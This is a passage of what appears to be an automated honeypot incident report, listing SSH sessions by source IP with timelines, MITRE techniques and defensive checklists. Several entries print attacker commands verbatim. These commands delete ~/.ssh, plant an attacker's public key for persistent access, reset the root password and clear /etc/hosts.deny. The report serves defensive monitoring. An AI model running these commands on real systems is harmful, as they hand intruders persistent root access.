| `2026-06-10 10:33:50` | `cowrie.client.kex` |
| `2026-06-10 10:33:51` | `cowrie.login.success` |
| `2026-06-10 10:33:51` | `cowrie.session.params` |
| `2026-06-10 10:33:51` | `cowrie.command.input` |
| `2026-06-10 10:33:52` | `cowrie.log.closed` |
| `2026-06-10 10:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12081d8d625

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:52` | `cowrie.session.connect` |
| `2026-06-10 10:33:52` | `cowrie.client.version` |
| `2026-06-10 10:33:52` | `cowrie.client.kex` |
| `2026-06-10 10:33:53` | `cowrie.login.success` |
| `2026-06-10 10:33:54` | `cowrie.session.params` |
| `2026-06-10 10:33:54` | `cowrie.command.input` |
| `2026-06-10 10:33:54` | `cowrie.log.closed` |
| `2026-06-10 10:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74b6b6a00246

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:55` | `cowrie.session.connect` |
| `2026-06-10 10:33:55` | `cowrie.client.version` |
| `2026-06-10 10:33:55` | `cowrie.client.kex` |
| `2026-06-10 10:33:56` | `cowrie.login.success` |
| `2026-06-10 10:33:56` | `cowrie.session.params` |
| `2026-06-10 10:33:56` | `cowrie.command.input` |
| `2026-06-10 10:33:57` | `cowrie.log.closed` |
| `2026-06-10 10:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e84bf3a7ad

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:33 |
| **Last Seen** | 2026-06-10 10:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:33:57` | `cowrie.session.connect` |
| `2026-06-10 10:33:57` | `cowrie.client.version` |
| `2026-06-10 10:33:57` | `cowrie.client.kex` |
| `2026-06-10 10:33:59` | `cowrie.login.success` |
| `2026-06-10 10:33:59` | `cowrie.session.params` |
| `2026-06-10 10:33:59` | `cowrie.command.input` |
| `2026-06-10 10:34:00` | `cowrie.log.closed` |
| `2026-06-10 10:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2829f5c04bf

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:34 |
| **Last Seen** | 2026-06-10 10:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:34:00` | `cowrie.session.connect` |
| `2026-06-10 10:34:00` | `cowrie.client.version` |
| `2026-06-10 10:34:00` | `cowrie.client.kex` |
| `2026-06-10 10:34:01` | `cowrie.login.success` |
| `2026-06-10 10:34:02` | `cowrie.session.params` |
| `2026-06-10 10:34:02` | `cowrie.command.input` |
| `2026-06-10 10:34:02` | `cowrie.log.closed` |
| `2026-06-10 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7277f57a8ec

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:34 |
| **Last Seen** | 2026-06-10 10:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:34:03` | `cowrie.session.connect` |
| `2026-06-10 10:34:03` | `cowrie.client.version` |
| `2026-06-10 10:34:03` | `cowrie.client.kex` |
| `2026-06-10 10:34:04` | `cowrie.login.success` |
| `2026-06-10 10:34:05` | `cowrie.session.params` |
| `2026-06-10 10:34:05` | `cowrie.command.input` |
| `2026-06-10 10:34:05` | `cowrie.log.closed` |
| `2026-06-10 10:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4afe4db6bc

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]254` |
| **First Seen** | 2026-06-10 10:34 |
| **Last Seen** | 2026-06-10 10:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a ; echo 'vT'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:34:05` | `cowrie.session.connect` |
| `2026-06-10 10:34:05` | `cowrie.client.version` |
| `2026-06-10 10:34:06` | `cowrie.client.kex` |
| `2026-06-10 10:34:07` | `cowrie.login.success` |
| `2026-06-10 10:34:07` | `cowrie.session.params` |
| `2026-06-10 10:34:07` | `cowrie.command.input` |
| `2026-06-10 10:34:08` | `cowrie.log.closed` |
| `2026-06-10 10:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]254` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-127f0c1ca063

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:35 |
| **Last Seen** | 2026-06-10 10:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:35:35` | `cowrie.session.connect` |
| `2026-06-10 10:35:35` | `cowrie.client.version` |
| `2026-06-10 10:35:35` | `cowrie.client.kex` |
| `2026-06-10 10:35:36` | `cowrie.login.success` |
| `2026-06-10 10:35:37` | `cowrie.session.params` |
| `2026-06-10 10:35:37` | `cowrie.command.input` |
| `2026-06-10 10:35:37` | `cowrie.command.failed` |
| `2026-06-10 10:35:37` | `cowrie.log.closed` |
| `2026-06-10 10:35:37` | `cowrie.session.params` |
| `2026-06-10 10:35:37` | `cowrie.command.input` |
| `2026-06-10 10:35:37` | `cowrie.session.file_download` |
| `2026-06-10 10:35:37` | `cowrie.log.closed` |
| `2026-06-10 10:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc45dc1a74e8

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:35 |
| **Last Seen** | 2026-06-10 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:35:41` | `cowrie.session.connect` |
| `2026-06-10 10:35:41` | `cowrie.client.version` |
| `2026-06-10 10:35:41` | `cowrie.client.kex` |
| `2026-06-10 10:35:42` | `cowrie.login.success` |
| `2026-06-10 10:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5191a38c405

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:45 |
| **Last Seen** | 2026-06-10 10:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:45:30` | `cowrie.session.connect` |
| `2026-06-10 10:45:30` | `cowrie.client.version` |
| `2026-06-10 10:45:30` | `cowrie.client.kex` |
| `2026-06-10 10:45:31` | `cowrie.login.success` |
| `2026-06-10 10:45:31` | `cowrie.session.params` |
| `2026-06-10 10:45:31` | `cowrie.command.input` |
| `2026-06-10 10:45:31` | `cowrie.command.failed` |
| `2026-06-10 10:45:31` | `cowrie.log.closed` |
| `2026-06-10 10:45:32` | `cowrie.session.params` |
| `2026-06-10 10:45:32` | `cowrie.command.input` |
| `2026-06-10 10:45:32` | `cowrie.session.file_download` |
| `2026-06-10 10:45:32` | `cowrie.log.closed` |
| `2026-06-10 10:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9c480496be

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:45 |
| **Last Seen** | 2026-06-10 10:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:45:34` | `cowrie.session.connect` |
| `2026-06-10 10:45:34` | `cowrie.client.version` |
| `2026-06-10 10:45:34` | `cowrie.client.kex` |
| `2026-06-10 10:45:35` | `cowrie.login.success` |
| `2026-06-10 10:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c78f1f48ec7

| Field | Detail |
|---|---|
| **Source IP** | `115.190.197[.]138` |
| **First Seen** | 2026-06-10 10:54 |
| **Last Seen** | 2026-06-10 10:54 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:3nPPFr1YIRFA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:54:24` | `cowrie.session.connect` |
| `2026-06-10 10:54:24` | `cowrie.client.version` |
| `2026-06-10 10:54:24` | `cowrie.client.kex` |
| `2026-06-10 10:54:24` | `cowrie.login.success` |
| `2026-06-10 10:54:25` | `cowrie.session.params` |
| `2026-06-10 10:54:25` | `cowrie.command.input` |
| `2026-06-10 10:54:25` | `cowrie.command.failed` |
| `2026-06-10 10:54:25` | `cowrie.log.closed` |
| `2026-06-10 10:54:26` | `cowrie.session.params` |
| `2026-06-10 10:54:26` | `cowrie.command.input` |
| `2026-06-10 10:54:26` | `cowrie.session.file_download` |
| `2026-06-10 10:54:26` | `cowrie.log.closed` |
| `2026-06-10 10:54:43` | `cowrie.session.params` |
| `2026-06-10 10:54:43` | `cowrie.command.input` |
| `2026-06-10 10:54:43` | `cowrie.log.closed` |
| `2026-06-10 10:54:43` | `cowrie.session.params` |
| `2026-06-10 10:54:43` | `cowrie.command.input` |
| `2026-06-10 10:54:43` | `cowrie.log.closed` |
| `2026-06-10 10:54:44` | `cowrie.session.params` |
| `2026-06-10 10:54:44` | `cowrie.command.input` |
| `2026-06-10 10:54:44` | `cowrie.session.file_download` |
| `2026-06-10 10:54:44` | `cowrie.log.closed` |
| `2026-06-10 10:54:44` | `cowrie.session.params` |
| `2026-06-10 10:54:44` | `cowrie.command.input` |
| `2026-06-10 10:54:44` | `cowrie.log.closed` |
| `2026-06-10 10:54:45` | `cowrie.session.params` |
| `2026-06-10 10:54:45` | `cowrie.command.input` |
| `2026-06-10 10:54:45` | `cowrie.log.closed` |
| `2026-06-10 10:54:45` | `cowrie.session.params` |
| `2026-06-10 10:54:45` | `cowrie.command.input` |
| `2026-06-10 10:54:45` | `cowrie.command.input` |
| `2026-06-10 10:54:45` | `cowrie.log.closed` |
| `2026-06-10 10:54:46` | `cowrie.session.params` |
| `2026-06-10 10:54:46` | `cowrie.command.input` |
| `2026-06-10 10:54:46` | `cowrie.log.closed` |
| `2026-06-10 10:54:46` | `cowrie.session.params` |
| `2026-06-10 10:54:46` | `cowrie.command.input` |
| `2026-06-10 10:54:46` | `cowrie.log.closed` |
| `2026-06-10 10:54:47` | `cowrie.session.params` |
| `2026-06-10 10:54:47` | `cowrie.command.input` |
| `2026-06-10 10:54:47` | `cowrie.log.closed` |
| `2026-06-10 10:54:47` | `cowrie.session.params` |
| `2026-06-10 10:54:47` | `cowrie.command.input` |
| `2026-06-10 10:54:47` | `cowrie.log.closed` |
| `2026-06-10 10:54:48` | `cowrie.session.params` |
| `2026-06-10 10:54:48` | `cowrie.command.input` |
| `2026-06-10 10:54:48` | `cowrie.log.closed` |
| `2026-06-10 10:54:48` | `cowrie.session.params` |
| `2026-06-10 10:54:48` | `cowrie.command.input` |
| `2026-06-10 10:54:48` | `cowrie.log.closed` |
| `2026-06-10 10:54:49` | `cowrie.session.params` |
| `2026-06-10 10:54:49` | `cowrie.command.input` |
| `2026-06-10 10:54:49` | `cowrie.log.closed` |
| `2026-06-10 10:54:49` | `cowrie.session.params` |
| `2026-06-10 10:54:49` | `cowrie.command.input` |
| `2026-06-10 10:54:49` | `cowrie.log.closed` |
| `2026-06-10 10:54:50` | `cowrie.session.params` |
| `2026-06-10 10:54:50` | `cowrie.command.input` |
| `2026-06-10 10:54:50` | `cowrie.log.closed` |
| `2026-06-10 10:54:50` | `cowrie.session.params` |
| `2026-06-10 10:54:50` | `cowrie.command.input` |
| `2026-06-10 10:54:50` | `cowrie.log.closed` |
| `2026-06-10 10:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.197[.]138` to AbuseIPDB if not already reported
- [ ] Block `115.190.197[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfc9e5803668

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:10 |
| **Last Seen** | 2026-06-10 11:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:10:42` | `cowrie.session.connect` |
| `2026-06-10 11:10:42` | `cowrie.client.version` |
| `2026-06-10 11:10:43` | `cowrie.client.kex` |
| `2026-06-10 11:10:43` | `cowrie.login.success` |
| `2026-06-10 11:10:44` | `cowrie.session.params` |
| `2026-06-10 11:10:44` | `cowrie.command.input` |
| `2026-06-10 11:10:44` | `cowrie.command.failed` |
| `2026-06-10 11:10:44` | `cowrie.log.closed` |
| `2026-06-10 11:10:44` | `cowrie.session.params` |
| `2026-06-10 11:10:44` | `cowrie.command.input` |
| `2026-06-10 11:10:45` | `cowrie.session.file_download` |
| `2026-06-10 11:10:45` | `cowrie.log.closed` |
| `2026-06-10 11:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3265e854f040

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:10 |
| **Last Seen** | 2026-06-10 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:10:47` | `cowrie.session.connect` |
| `2026-06-10 11:10:47` | `cowrie.client.version` |
| `2026-06-10 11:10:47` | `cowrie.client.kex` |
| `2026-06-10 11:10:48` | `cowrie.login.success` |
| `2026-06-10 11:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37ad8d11825f

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:13 |
| **Last Seen** | 2026-06-10 11:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:13:42` | `cowrie.session.connect` |
| `2026-06-10 11:13:42` | `cowrie.client.version` |
| `2026-06-10 11:13:42` | `cowrie.client.kex` |
| `2026-06-10 11:13:43` | `cowrie.login.success` |
| `2026-06-10 11:13:43` | `cowrie.session.params` |
| `2026-06-10 11:13:43` | `cowrie.command.input` |
| `2026-06-10 11:13:43` | `cowrie.command.failed` |
| `2026-06-10 11:13:44` | `cowrie.log.closed` |
| `2026-06-10 11:13:44` | `cowrie.session.params` |
| `2026-06-10 11:13:44` | `cowrie.command.input` |
| `2026-06-10 11:13:44` | `cowrie.session.file_download` |
| `2026-06-10 11:13:44` | `cowrie.log.closed` |
| `2026-06-10 11:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2310ab5b0da3

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:13 |
| **Last Seen** | 2026-06-10 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:13:46` | `cowrie.session.connect` |
| `2026-06-10 11:13:46` | `cowrie.client.version` |
| `2026-06-10 11:13:47` | `cowrie.client.kex` |
| `2026-06-10 11:13:48` | `cowrie.login.success` |
| `2026-06-10 11:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef967f3f8a09

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:21 |
| **Last Seen** | 2026-06-10 11:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:21:16` | `cowrie.session.connect` |
| `2026-06-10 11:21:16` | `cowrie.client.version` |
| `2026-06-10 11:21:16` | `cowrie.client.kex` |
| `2026-06-10 11:21:18` | `cowrie.login.success` |
| `2026-06-10 11:21:18` | `cowrie.session.params` |
| `2026-06-10 11:21:18` | `cowrie.command.input` |
| `2026-06-10 11:21:18` | `cowrie.command.failed` |
| `2026-06-10 11:21:19` | `cowrie.log.closed` |
| `2026-06-10 11:21:19` | `cowrie.session.params` |
| `2026-06-10 11:21:19` | `cowrie.command.input` |
| `2026-06-10 11:21:19` | `cowrie.session.file_download` |
